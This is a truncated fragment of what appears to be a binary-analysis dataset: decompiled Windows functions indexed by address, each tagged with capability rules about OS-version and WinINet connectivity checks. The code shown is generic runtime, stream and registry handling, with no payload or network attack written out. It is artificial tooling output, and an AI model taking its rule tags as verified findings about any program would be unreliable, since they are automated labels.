        "decompiled_code": "\nuint __cdecl fcn.00420ae4(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420b33;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0xc))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 227
    },
    "00420b4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420b4c(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420b9b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0x10))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 230
    },
    "00420c9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00420c9c(int32_t arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    puStack60 = 0x420cad;\n    fcn.00407080();\n    uStack64 = 0x420e8f;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_4h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack76 = 0x420e68;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if (arg_14h == 0) {\n        if (arg_10h < 0x100001) {\ncode_r0x00420d06:\n            var_ch = arg_10h;\n            goto code_r0x00420d0c;\n        }\n    }\n    else if (arg_14h < 1) goto code_r0x00420d06;\n    var_ch = 0x100000;\ncode_r0x00420d0c:\n    puStack84 = 0x420d14;\n    puStack60 = &stack0xfffffffc;\n    var_8h = fcn.00402f00();\n    uStack88 = 0x420e57;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    do {\n        if (arg_14h == 0) {\n            if (arg_10h == 0) {\ncode_r0x00420e17:\n                *in_FS_OFFSET = uStack92;\n                puStack84 = 0x420e5e;\n                uStack88 = 0x420e2c;\n                fcn.00402f1c();\n                if (arg_1ch != NULL) {\n                    *arg_1ch = var_20h;\n                    arg_1ch[1] = var_1ch;\n                }\n                if (arg_18h != NULL) {\n                    *arg_18h = var_18h;\n                    arg_18h[1] = var_14h;\n                }\n                return;\n            }\n        }\n        else if (arg_14h < 1) goto code_r0x00420e17;\n        uVar1 = arg_10h;\n        if (arg_14h == 0) {\n            if (0x7fffffff < arg_10h) {\ncode_r0x00420d3d:\n                uVar1 = 0x7fffffff;\n            }\n        }\n        else if (0 < arg_14h) goto code_r0x00420d3d;\n        for (; 0 < uVar1; uVar1 = uVar1 - uVar2) {\n            var_10h = uVar1;\n            if (var_ch < uVar1) {\n                var_10h = var_ch;\n            }\n            uVar2 = (**(**(arg_8h + 0xc) + 0xc))();\n            if (uVar2 == 0) {\n                fcn.00404f70();\n                *in_FS_OFFSET = uStack92;\ncode_r0x00420e79:\n                *in_FS_OFFSET = uStack80;\n                puStack72 = 0x420e96;\n                uStack76 = 0x420e8e;\n                fcn.0040700c();\n                return;\n            }\n            bVar3 = CARRY4(var_18h, uVar2);\n            var_18h = var_18h + uVar2;\n            var_14h = var_14h + (uVar2 >> 0x1f) + bVar3;\n            var_28h = 0;\n            var_24h = 0;\n            var_4h = (**(*arg_ch + 0x10))(arg_ch, var_8h, uVar2, &fcn.00420c9c::var_28h);\n            bVar3 = CARRY4(var_20h, var_28h);\n            var_20h = var_20h + var_28h;\n            var_1ch = var_1ch + var_24h + bVar3;\n            if ((var_4h == 0) && (uVar2 != var_28h)) {\n                var_4h = -0x7fffbffb;\n            }\n            if (var_4h != 0) {\n                fcn.00404f70();\n                *in_FS_OFFSET = uStack92;\n                goto code_r0x00420e79;\n            }\n            bVar3 = arg_10h < uVar2;\n            arg_10h = arg_10h - uVar2;\n            arg_14h = (arg_14h - (uVar2 >> 0x1f)) - bVar3;\n        }\n    } while( true );\n}\n",
        "token_count": 1326
    },
    "00421004": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00421004(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x4979ec;\n    if (*0x4979f0 == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x4979ec;\n        fcn.004030fc();\n        uVar2 = fcn.00420ffc();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.00420ffc();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x4979f0;\n            puVar3 = puVar4 + 0xd;\n            *0x4979f0 = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x4979ec = puVar1;\n    puVar3 = *0x4979f0;\n    puVar1 = *0x4979f0 + 5;\n    *0x4979f0 = *(*0x4979f0 + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 377
    },
    "004210c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004210c0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x48fb60 = *0x4957f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4957f8, *0x48fb74, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x48fb74, *0x4957f8);\n        }\n        sub.user32.dll_RegisterClassA(0x48fb50);\n    }\n    uVar2 = fcn.0040856c(0, *0x4957f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.00421004(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 298
    },
    "004216f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004216f0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) != 0) {\n        if (*(in_EAX + 0xc) == '\\0') {\n            sub.advapi32.dll_RegFlushKey(*(in_EAX + 4));\n        }\n        sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 4));\n        *(in_EAX + 4) = 0;\n        fcn.00405530();\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00421720": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421720(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 8)) {\n        if (*(in_EAX + 0x14) != '\\0') {\n            sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 8));\n            *(in_EAX + 0x14) = 0;\n        }\n        *(in_EAX + 8) = param_2;\n        fcn.004216f0();\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00421864": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00421864(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x421969;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.004055c8();\n    uVar1 = fcn.004215d8();\n    if (uVar1 == 0) {\n        fcn.00405a84();\n    }\n    var_ch = 0;\n    if ((var_5h == '\\0') || (var_4h == 0)) {\n        uVar2 = fcn.004059dc(0, *(in_EAX + 0x18), &var_ch);\n        uVar2 = fcn.00421770(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    }\n    else {\n        uVar2 = fcn.004059dc(0, 0, 0, *(in_EAX + 0x18), 0, &var_ch, &var_10h);\n        uStack76 = fcn.00421770(uVar2);\n        iVar3 = sub.advapi32.dll_RegCreateKeyExA();\n    }\n    var_6h = iVar3 == 0;\n    if (var_6h) {\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.004058e0(var_4h, 0x421984, *(in_EAX + 0x10));\n        }\n        fcn.0042174c();\n    }\n    *in_FS_OFFSET = uStack76;\n    fcn.00405530(0x421970);\n    return;\n}\n",
        "token_count": 490
    },
    "00421988": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00421988(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff90;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x421b39;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.004055c8();\n    uVar1 = fcn.004215d8();\n    if (uVar1 == 0) {\n        fcn.00405a84();\n    }\n    var_ch = 0;\n    uVar4 = *(in_EAX + 0x18) & 0x300;\n    uVar2 = fcn.004059dc(0, uVar4 | 0x20019, &var_ch);\n    uVar2 = fcn.00421770(uVar2);\n    iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    var_5h = iVar3 == 0;\n    if (var_5h) {\n        *(in_EAX + 0x18) = uVar4 | 0x20019;\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.004058e0(var_4h, 0x421b54, *(in_EAX + 0x10));\n        }\n        fcn.0042174c();\n    }\n    else {\n        uVar2 = fcn.004059dc(0, uVar4 | 0x20009, &var_ch);\n        uVar2 = fcn.00421770(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n        var_5h = iVar3 == 0;\n        if (var_5h) {\n            *(in_EAX + 0x18) = uVar4 | 0x20009;\n            if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                fcn.004058e0(var_4h, 0x421b54, *(in_EAX + 0x10));\n            }\n            fcn.0042174c();\n        }\n        else {\n            uVar2 = fcn.004059dc(0, uVar4 | 1, &var_ch);\n            uVar2 = fcn.00421770(uVar2);\n            iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n            var_5h = iVar3 == 0;\n            if (var_5h) {\n                *(in_EAX + 0x18) = uVar4 | 1;\n                if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                    in_stack_ffffff90 = var_4h;\n                    fcn.004058e0(var_4h, 0x421b54, *(in_EAX + 0x10));\n                }\n                fcn.0042174c();\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff90;\n    fcn.00405530(0x421b40);\n    return;\n}\n",
        "token_count": 792
    },
    "00421b58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00421b58(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    int32_t iStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint hKey;\n    uint var_18h;\n    int32_t var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack76 = 0x421cc2;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x421b87;\n    fcn.004055c8();\n    puStack84 = 0x421b8f;\n    var_11h._0_1_ = fcn.004215d8();\n    if (var_11h == '\\0') {\n        puStack84 = 0x421baa;\n        fcn.00405a84();\n    }\n    puStack84 = 0x421bbd;\n    iVar2 = fcn.004221f4();\n    if (iVar2 != 0) {\n        iStack88 = 0x421c78;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        puStack84 = &stack0xfffffffc;\n        fcn.00421784();\n        cVar1 = fcn.00421cf0();\n        if (cVar1 != '\\0') {\n            fcn.00405620();\n            iVar4 = var_38h + -1;\n            if (-1 < iVar4) {\n                do {\n                    *NULL = var_34h + 1;\n                    fcn.004059dc(&fcn.00421b58::var_11h + 1, 0, 0, 0, 0);\n                    iStack92 = iVar2;\n                    iVar3 = sub.advapi32.dll_RegEnumKeyExA();\n                    if (iVar3 == 0) {\n                        fcn.004059dc();\n                        fcn.00405728();\n                        fcn.00421b58();\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != -1);\n            }\n        }\n        *in_FS_OFFSET = iStack92;\n        puStack84 = 0x421c7f;\n        iStack88 = 0x421c6e;\n        fcn.00421784();\n        iStack92 = 0x421c77;\n        iStack88 = iVar2;\n        sub.advapi32.dll_RegCloseKey_1();\n        return;\n    }\n    puStack84 = 0x421c87;\n    puStack84 = fcn.004059dc();\n    iStack88 = 0x421c94;\n    iStack88 = fcn.00421770();\n    iStack92 = 0x421c9a;\n    sub.advapi32.dll_RegDeleteKeyA();\n    *in_FS_OFFSET = iStack88;\n    iStack80 = 0x421cc9;\n    puStack84 = 0x421cb4;\n    fcn.00405530();\n    puStack84 = 0x421cc1;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 814
    },
    "00421cf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00421cf0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    fcn.00403af4();\n    uVar1 = sub.advapi32.dll_RegQueryInfoKeyA\n                      (*(in_EAX + 4), 0, 0, 0, param_2, param_2 + 4, 0, param_2 + 8, param_2 + 0xc, param_2 + 0x10, 0, \n                       param_2 + 0x14);\n    if ((*(*0x4927e0 + 0xc) != '\\0') && (**0x4927cc == 2)) {\n        *(param_2 + 4) = *(param_2 + 4) + *(param_2 + 4);\n        *(param_2 + 0xc) = *(param_2 + 0xc) + *(param_2 + 0xc);\n    }\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 247
    },
    "004220a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004220a4(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_10h;\n    int32_t var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    cVar1 = fcn.00421ee8();\n    if (cVar1 == '\\0') {\n        var_ch = 0;\n    }\n    else if (((var_10h == '\\x04') || (var_10h == '\\0')) && (var_ch <= arg_8h)) {\n        fcn.00422170(&var_5h, var_ch);\n    }\n    else {\n        fcn.004215ac();\n    }\n    return var_ch;\n}\n",
        "token_count": 171
    },
    "0042254c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042254c(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uchar *puStack156;\n    uint uStack152;\n    uint uStack148;\n    uchar *puStack144;\n    int32_t iStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t dwIndex;\n    int32_t var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_50h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    var_4h = 0;\n    uStack92 = 0x42278d;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    var_18h = *(*(arg_8h + -4) + 4);\n    puStack100 = 0x42258e;\n    hKey = in_EAX;\n    fcn.00421784();\n    uStack104 = 0x422763;\n    uStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    uStack112 = 0x4225aa;\n    puStack100 = &stack0xfffffffc;\n    cVar1 = fcn.00421cf0();\n    if (cVar1 != '\\0') {\n        uStack112 = 0x4225c0;\n        fcn.00405620();\n        if (-1 < var_44h + -1) {\n            var_28h = var_44h;\n            dwIndex = 0;\n            do {\n                var_10h = var_40h + 1;\n                uStack112 = 0;\n                uStack116 = 0;\n                uStack120 = 0;\n                uStack124 = 0;\n                puStack128 = &fcn.0042254c::var_10h;\n                uStack132 = 0x4225f2;\n                uStack132 = fcn.004059dc();\n                iStack136 = dwIndex;\n                uStack108 = hKey;\n                puStack144 = 0x422600;\n                iVar2 = sub.advapi32.dll_RegEnumKeyExA();\n                if (iVar2 == 0) {\n                    puStack144 = 0x422610;\n                    fcn.004059dc();\n                    puStack144 = 0x42261a;\n                    fcn.00405728();\n                    puStack144 = 0x422628;\n                    var_20h = fcn.004221f4();\n                    if (var_20h != 0) {\n                        uStack148 = 0x422734;\n                        uStack152 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff68;\n                        var_1ch = *(*(arg_8h + -4) + 4);\n                        puStack156 = 0x42265d;\n                        puStack144 = &stack0xfffffffc;\n                        fcn.00421784();\n                        uStack160 = 0x422716;\n                        uStack164 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff5c;\n                        puStack168 = 0x422673;\n                        puStack156 = &stack0xfffffffc;\n                        fcn.004059dc();\n                        puStack168 = 0x42267d;\n                        fcn.00405728();\n                        puStack168 = 0x42268b;\n                        fcn.00421788();\n                        puStack168 = 0x422693;\n                        fcn.004059dc();\n                        puStack168 = 0x42269d;\n                        fcn.00405728();\n                        puStack168 = 0x4226ab;\n                        var_24h = fcn.004221f4();\n                        uStack172 = 0x4226f3;\n                        uStack176 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff50;\n                        puStack168 = &stack0xfffffffc;\n                        fcn.00422424(arg_8h);\n                        fcn.0042254c(arg_8h);\n                        *in_FS_OFFSET = uStack176;\n                        puStack168 = 0x4226fa;\n                        uStack172 = var_24h;\n                        uStack176 = 0x4226f2;\n                        sub.advapi32.dll_RegCloseKey_1();\n                        return;\n                    }\n                }\n                dwIndex = dwIndex + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack108;\n    puStack100 = 0x42276a;\n    uStack104 = 0x422762;\n    fcn.00421784();\n    return;\n}\n",
        "token_count": 1254
    },
    "00422798": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422798(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    int32_t iStack44;\n    uchar *puStack40;\n    uint uStack36;\n    int32_t iStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4227b1;\n    cVar1 = fcn.0042228c();\n    if (cVar1 != '\\0') {\n        puStack28 = 0x4227c3;\n        cVar1 = fcn.0042228c();\n        if (cVar1 == '\\0') {\n            puStack28 = 0x4227d5;\n            iVar2 = fcn.004221f4();\n            if (iVar2 != 0) {\n                iStack32 = 0x42287a;\n                uStack36 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffdc;\n                puStack40 = 0x4227fa;\n                puStack28 = &stack0xfffffffc;\n                fcn.00421788();\n                puStack40 = 0x422804;\n                iVar3 = fcn.004221f4();\n                if (iVar3 != 0) {\n                    iStack44 = 0x42285c;\n                    uStack48 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffd0;\n                    puStack40 = &stack0xfffffffc;\n                    fcn.00422424(&stack0xfffffffc);\n                    fcn.0042254c(&stack0xfffffffc);\n                    if (arg_8h != '\\0') {\n                        fcn.00421b58();\n                    }\n                    *in_FS_OFFSET = uStack48;\n                    puStack40 = 0x422863;\n                    uStack48 = 0x42285b;\n                    iStack44 = iVar3;\n                    sub.advapi32.dll_RegCloseKey_1();\n                    return;\n                }\n                *in_FS_OFFSET = uStack36;\n                puStack28 = 0x422881;\n                uStack36 = 0x422879;\n                iStack32 = iVar2;\n                sub.advapi32.dll_RegCloseKey_1();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 532
    },
    "004239b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004239b4(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4239cf;\n    iVar2 = fcn.00423928();\n    puStack24 = 0x4239d9;\n    fcn.0042399c();\n    uStack28 = 0x423a88;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (var_8h = *(in_EAX + 4); var_8h != NULL; var_8h = *var_8h) {\n        if (iVar2 == *(var_8h + 3)) {\n            cVar1 = fcn.00409944();\n            if (cVar1 != '\\0') break;\n        }\n    }\n    if (var_8h == NULL) {\n        var_8h = fcn.00402f00();\n        *var_8h = *(in_EAX + 4);\n        var_8h[1] = 0;\n        var_8h[2] = *param_2;\n        *(var_8h + 3) = iVar2;\n        fcn.004030fc();\n        *(in_EAX + 4) = var_8h;\n    }\n    var_8h[1] = var_8h[1] + 1;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x423a8f;\n    uStack28 = 0x423a87;\n    fcn.004239a8();\n    return;\n}\n",
        "token_count": 429
    },
    "00423a98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423a98(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 == NULL) {\n        return;\n    }\n    uStack28 = 0x423abd;\n    fcn.0042399c();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    param_2[1] = param_2[1] + -1;\n    if (param_2[1] == 0) {\n        puVar1 = *(in_EAX + 4);\n        if (*(in_EAX + 4) == param_2) {\n            *(in_EAX + 4) = *param_2;\n        }\n        else {\n            do {\n                puVar2 = puVar1;\n                puVar1 = *puVar2;\n            } while (puVar1 != param_2);\n            *puVar2 = *param_2;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x423b27;\n    uStack32 = 0x423b1f;\n    fcn.004239a8();\n    return;\n}\n",
        "token_count": 327
    },
    "00423c54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
